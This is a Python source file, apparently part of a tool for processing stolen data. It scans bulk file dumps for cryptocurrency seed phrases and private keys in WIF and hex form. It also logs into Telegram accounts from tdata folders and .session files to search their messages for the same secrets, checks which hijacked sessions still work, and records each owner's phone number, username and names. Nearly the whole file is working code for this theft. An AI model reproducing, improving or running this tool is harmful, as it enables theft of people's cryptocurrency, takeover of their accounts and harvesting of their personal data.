import os
import logging
import asyncio
import async_timeout
from asyncio import Semaphore
from secrets import token_hex
from typing import List, Dict, Tuple

import fitz
import ezodf
import docx2txt

from app import (
    fix_path,
    read_file,
    update_progress,
    find_files,
    progress_create,
    chunks,
    checkValidTelegramClient,
    pinfo,
    perror,
)
from app.parsers.text import parsing_crypto_from_srting
from app.parsers.telegram import check_user_messages_is_crypto
from app.tdata import telethonsFromTdata
from app.session import telethonFromSession


class FilesParser:
    def __init__(self, config: dict):
        self.config: dict = config["ПАРСИНГ_ФАЙЛОВ"]

    async def main_task(self, file_path: str, sem: Semaphore, progress, task):
        async with sem:
            try:
                async with async_timeout.timeout(self.config["макс_время_работы_потока"]):
                    file_path = fix_path(file_path)
                    file_data = await self._extract_file_data(file_path)
                    result = await parsing_crypto_from_srting(file_data, self.config)
                    if result:
                        seeds, wifs, hexs = result
                        seeds = [[seed, file_path] for seed in seeds]
                        self.seeds.extend(seeds)
                        self.wifs.extend(wifs)
                        self.hexs.extend(hexs)
            except Exception as e:
                logging.error(f"Error processing file {file_path}: {e}")
            finally:
                update_progress(task, progress)

    async def _extract_file_data(self, file_path: str) -> str:
        """Extract text data from different file formats."""
        try:
            if file_path.endswith(".pdf"):
                return self._extract_pdf_text(file_path)
            elif file_path.endswith(".odt"):
                return self._extract_odt_text(file_path)
            elif file_path.endswith(".docx"):
                return self._extract_docx_text(file_path)
            else:
                return await read_file(file_path)
        except Exception as e:
            logging.error(f"Error extracting data from file {file_path}: {e}")
            return await read_file(file_path)

    def _extract_pdf_text(self, file_path: str) -> str:
        """Extract text from PDF file."""
        with fitz.open(file_path) as doc:
            return "".join(page.get_text() for page in doc)

    def _extract_odt_text(self, file_path: str) -> str:
        """Extract text from ODT file."""
        odt = ezodf.opendoc(file_path)
        return "\n".join(i.text.lower() if i.text else '' for i in odt.body)

    def _extract_docx_text(self, file_path: str) -> str:
        """Extract text from DOCX file."""
        return docx2txt.process(file_path)

    async def __call__(self):
        self.files_path = fix_path(self.config["папка_данных"])
        self.seeds = []
        self.wifs = []
        self.hexs = []
        white_list_files = self.config["белый_список_файлов"] or None
        self.files = find_files(
            self.files_path, white_list_files, True, black_list_files=self.config["черный_список_файлов"]
        )
        sem = Semaphore(self.config["макс_потоков"])
        progress, task = progress_create(len(self.files), "[#ffffff]PROGRESS:[/#ffffff]")

        with progress:
            for chunk in chunks(self.files, 10_000):
                await asyncio.gather(
                    *(self.main_task(fix_path(self.files_path, file), sem, progress, task) for file in chunk),
                    return_exceptions=False,
                )
        return True


class TdataParsing:
    def __init__(self, config: dict):
        self.config: dict = config["ПАРСИНГ_ТЕЛЕГРАММ"]

    async def main_task(self, tdata_path: str, sem: Semaphore, progress, task):
        async with sem:
            try:
                async with async_timeout.timeout(self.config["макс_время_работы_потока"]):
                    clients = await telethonsFromTdata(fix_path(tdata_path))
                    for client in clients:
                        await self._process_client(client, tdata_path)
            except Exception as e:
                logging.error(f"Error processing tdata {tdata_path}: {e}")
            finally:
                update_progress(task, progress)

    async def _process_client(self, client, tdata_path: str):
        """Process Telegram client."""
        try:
            await client.connect()
            result = await check_user_messages_is_crypto(client, self.config)
            if result:
                seeds, wifs, hexs = result
                self.seeds.extend([[seed, tdata_path] for seed in seeds])
                self.wifs.extend(wifs)
                self.hexs.extend(hexs)
        except Exception as e:
            logging.error(f"Error processing client for tdata {tdata_path}: {e}")
        finally:
            await self._disconnect_client(client)

    async def _disconnect_client(self, client):
        """Disconnect Telegram client."""
        try:
            await client.disconnect()
        except Exception as e:
            logging.error(f"Error disconnecting client: {e}")

    async def __call__(self):
        self.tdatas_path = fix_path(self.config["папка_данных"])
        self.seeds = []
        self.wifs = []
        self.hexs = []
        self.tdatas = list(map(os.path.dirname, find_files(self.tdatas_path, ["key_datas"], True)))
        sem = Semaphore(self.config["макс_потоков"])
        progress, task = progress_create(len(self.tdatas), "[#ffffff]PROGRESS:[/#ffffff]")
        with progress:
            for chunk in chunks(self.tdatas, 10_000):
                await asyncio.gather(
                    *(self.main_task(fix_path(self.tdatas_path, tdata), sem, progress, task) for tdata in chunk),
                    return_exceptions=False,
                )
        return True


class SessionsParsing:
    def __init__(self, config: dict):
        self.config: dict = config["ПАРСИНГ_ТЕЛЕГРАММ"]

    async def main_task(self, session_path: str, sem: Semaphore, progress, task):
        async with sem:
            try:
                async with async_timeout.timeout(self.config["макс_время_работы_потока"]):
                    client = await telethonFromSession(fix_path(session_path))
                    await self._process_client(client, session_path)
            except Exception as e:
                logging.error(f"Error processing session {session_path}: {e}")
            finally:
                update_progress(task, progress)

    async def _process_client(self, client, session_path: str):
        """Process Telegram client."""
        try:
            await client.connect()
            result = await check_user_messages_is_crypto(client, self.config)
            if result:
                seeds, wifs, hexs = result
                self.seeds.extend([[seed, session_path] for seed in seeds])
                self.wifs.extend(wifs)
                self.hexs.extend(hexs)
        except Exception as e:
            logging.error(f"Error processing client for session {session_path}: {e}")
        finally:
            await self._disconnect_client(client)

    async def _disconnect_client(self, client):
        """Disconnect Telegram client."""
        try:
            await client.disconnect()
        except Exception as e:
            logging.error(f"Error disconnecting client: {e}")

    async def __call__(self):
        self.sessions_path = fix_path(self.config["папка_данных"])
        self.seeds = []
        self.wifs = []
        self.hexs = []
        self.sessions = find_files(self.sessions_path, ["*.session"], True)
        sem = Semaphore(self.config["макс_потоков"])
        progress, task = progress_create(len(self.sessions), "[#ffffff]PROGRESS:[/#ffffff]")
        with progress:
            for chunk in chunks(self.sessions, 10_000):
                await asyncio.gather(
                    *(self.main_task(fix_path(self.sessions_path, session), sem, progress, task) for session in chunk),
                    return_exceptions=False,
                )
        return True


class TdataChecker:
    def __init__(self, config: dict):
        self.config: dict = config["ЧЕК_ТЕЛЕГРАММ"]

    async def main_task(self, tdata_path: str, sem: Semaphore, progress, task):
        async with sem:
            try:
                async with async_timeout.timeout(self.config["макс_время_работы_потока"]):
                    clients = await telethonsFromTdata(fix_path(tdata_path)) or []
                    for client in clients:
                        await self._process_client(client, tdata_path)
            except Exception as e:
                logging.error(f"Error checking tdata {tdata_path}: {e}")
            finally:
                update_progress(task, progress)

    async def _process_client(self, client, tdata_path: str):
        """Process Telegram client."""
        try:
            await client.connect()
            me = await checkValidTelegramClient(client)
            if me:
                self._save_valid_tdata(me, tdata_path)
                pinfo(f"Тдата прошла проверку на валид: {tdata_path}")
        except Exception as e:
            perror(f"Тдата {tdata_path} не прошла проверку из за ошибки: {e}")
        finally:
            await self._disconnect_client(client)

    async def _disconnect_client(self, client):
        """Disconnect Telegram client."""
        try:
            await client.disconnect()
        except Exception as e:
            logging.error(f"Error disconnecting client: {e}")

    def _save_valid_tdata(self, me, tdata_path: str):
        """Save valid tdata."""
        if self.config["сохранять_данные_телеграмм"]:
            format_data = {
                "path": tdata_path,
                "username": me.username,
                "phone": me.phone,
                "id": me.id,
                "first_name": me.first_name,
                "last_name": me.last_name,
                "deleted": me.deleted,
                "lang_code": me.lang_code,
                "premium": me.premium,
                "scam": me.scam,
                "verified": me.verified,
            }
            if self.config["заменять_когда_нет_ника"] and me.username is None:
                format_data["username"] = self.config["заменять_когда_нет_ника"]
            format_data_text = self.config["формат_данных_телеграмм"].format(**format_data)
        else:
            format_data_text = None
        self.valid_tdatas.append([tdata_path, format_data_text])

    async def __call__(self):
        self.tdatas_path = fix_path(self.config["папка_данных"])
        self.valid_tdatas = []
        self.tdatas = list(map(os.path.dirname, find_files(self.tdatas_path, ["key_datas"], True)))
        sem = Semaphore(self.config["макс_потоков"])
        progress, task = progress_create(len(self.tdatas), "[#ffffff]PROGRESS:[/#ffffff]")
        with progress:
            for chunk in chunks(self.tdatas, 10_000):
                await asyncio.gather(
                    *(self.main_task(fix_path(self.tdatas_path, tdata), sem, progress, task) for tdata in chunk),
                    return_exceptions=False,
                )
        return True


class SessionsChecker:
    def __init__(self, config: dict):
        self.config: dict = config["ЧЕК_ТЕЛЕГРАММ"]

    async def main_task(self, session_path: str, sem: Semaphore, progress, task):
        async with sem:
            try:
                async with async_timeout.timeout(self.config["макс_время_работы_потока"]):
                    client = await telethonFromSession(fix_path(session_path))
                    await self._process_client(client, session_path)
            except Exception as e:
                logging.error(f"Error checking session {session_path}: {e}")
            finally:
                update_progress(task, progress)

    async def _process_client(self, client, session_path: str):
        """Process Telegram client."""
        try:
            await client.connect()
            me = await checkValidTelegramClient(client)
            if me:
                self._save_valid_session(me, session_path)
                pinfo(f"Сессия прошла проверку на валид: {session_path}")
        except Exception as e:
            perror(f"Сессия {session_path} не прошла проверку из за ошибки: {e}")
        finally:
            await self._disconnect_client(client)

    async def _disconnect_client(self, client):
        """Disconnect Telegram client."""
        try:
            await client.disconnect()
        except Exception as e:
            logging.error(f"Error disconnecting client: {e}")

    def _save_valid_session(self, me, session_path: str):
        """Save valid session."""
        if self.config["сохранять_данные_телеграмм"]:
            format_data = {
                "path": session_path,
                "username": me.username,
                "phone": me.phone,
                "id": me.id,
                "first_name": me.first_name,
                "last_name": me.last_name,
                "deleted": me.deleted,
                "lang_code": me.lang_code,
                "premium": me.premium,
                "scam": me.scam,
                "verified": me.verified,
            }
            if self.config["заменять_когда_нет_ника"] and me.username is None:
                format_data["username"] = self.config["заменять_когда_нет_ника"]
            format_data_text = self.config["формат_данных_телеграмм"].format(**format_data)
        else:
            format_data_text = None
        self.valid_sessions.append([session_path, format_data_text])

    async def __call__(self):
        self.sessions_path = fix_path(self.config["папка_данных"])
        self.valid_sessions = []
        self.sessions = find_files(self.sessions_path, ["*.session"], True)
        sem = Semaphore(self.config["макс_потоков"])
        progress, task = progress_create(len(self.sessions), "[#ffffff]PROGRESS:[/#ffffff]")
        with progress:
            for chunk in chunks(self.sessions, 10_000):
                await asyncio.gather(
                    *(self.main_task(fix_path(self.sessions_path, session), sem, progress, task) for session in chunk),
                    return_exceptions=False,
                )
        return True